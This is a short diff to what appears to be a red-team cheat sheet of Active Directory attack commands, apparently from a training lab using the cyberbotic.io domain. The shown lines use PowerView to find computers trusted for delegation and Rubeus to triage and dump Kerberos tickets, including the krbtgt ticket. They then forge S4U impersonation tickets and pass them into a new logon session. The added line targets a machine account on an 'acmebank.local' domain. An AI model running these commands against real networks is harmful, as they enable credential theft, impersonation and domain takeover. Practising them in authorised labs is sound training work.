@@ -46,6 +46,7 @@ powershell Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-
 powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo #To find what services it could delegate for
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:JOHN-PC$ /msdsspn:cifs/John-PC.acmebank.local /ticket:
 execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
 execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip...]
